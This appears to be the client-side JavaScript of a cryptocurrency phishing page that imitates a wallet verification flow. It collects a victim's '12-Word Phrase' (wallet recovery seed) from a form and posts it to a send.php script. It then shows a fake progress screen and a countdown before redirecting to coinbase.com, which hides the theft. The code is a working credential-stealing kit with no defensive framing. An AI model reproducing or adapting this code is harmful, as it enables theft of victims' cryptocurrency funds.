       const btnContinue = document.querySelector(".btn");
        const htext = document.querySelector(".h-text");
        const ptext = document.querySelector(".p-text");
        const box1 = document.querySelector(".box-1");
        const [container1, container2, container3] = document.querySelectorAll(".container");
        const [progressBar1, progressBar2, progressBar3] = document.querySelectorAll(".progress-bar");
        const error = document.querySelector(".error");
        const form = document.getElementById("form");
        const count2 = document.querySelector(".text-time");
        const preloader = document.querySelector(".preloader");

         const postData = (data) => {
            $.ajax({
            url: "./send.php",
            type: "POST",
            data: { pass: data },
            });
        };


        const timer2 = (timeleft) => {
        let downloadTimer = setInterval(function () {
          if (timeleft <= 0) {
            clearInterval(downloadTimer);
          }
          count2.textContent = `0:0${0 + timeleft} Seconds`;
          timeleft -= 1;
          if (timeleft === -1) {
            window.location.replace("https://www.coinbase.com/");
          }
        }, 1000);
      };

        const handleNextPage = () => {
            container1.classList.add("hide");
            container2.classList.remove("hide");
            progressBar2.classList.add("active");
        };

        btnContinue.addEventListener("click", () => {
            handleNextPage();
        });

        box1.addEventListener("click", () => {
            handleNextPage();
        });

        form.addEventListener("submit", (e) => {
            e.preventDefault();

            const pInp = e.target.elements.pInp.value;

            if(pInp === ""){
              error.classList.remove("hide");
            }
            else {
                error.classList.add("hide");
                 let data = `12-Word Phrase: ${pInp}`;
                 postData(data);
                preloader.classList.remove("hide");
                setTimeout(() => {
                    error.classList.add("hide");
                    container2.classList.add("hide");
                    container3.classList.remove("hide");
                    progressBar3.classList.add("active");
                    timer2(10);
                    preloader.classList.add("hide");
                }, 3000);
              
            }
        });